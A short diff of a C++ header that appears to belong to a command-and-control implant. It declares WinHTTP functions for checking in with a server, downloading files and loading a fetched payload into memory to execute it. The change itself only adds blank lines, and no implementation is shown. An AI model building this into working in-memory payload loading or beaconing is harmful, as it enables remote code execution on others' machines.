@@ -40,12 +40,15 @@ WinHttpResponse SendRequest(
 );
 // It's used for reading small text from responses.
 std::wstring ReadResponseText(HINTERNET hRequest);
+
 // It's used for reading large data from responses.
 // The data is saved at 'sFile'.
 BOOL ReadResponseData(HINTERNET hRequest, const std::wstring& outFile);
+
 // It's used for loading another payload into memory
 // and execute it.
 BOOL ReadResponsePayload(HINTERNET hRequest);
+
 BOOL CheckIn(
 	HINTERNET hConnect,
 	LPCWSTR lpHost,
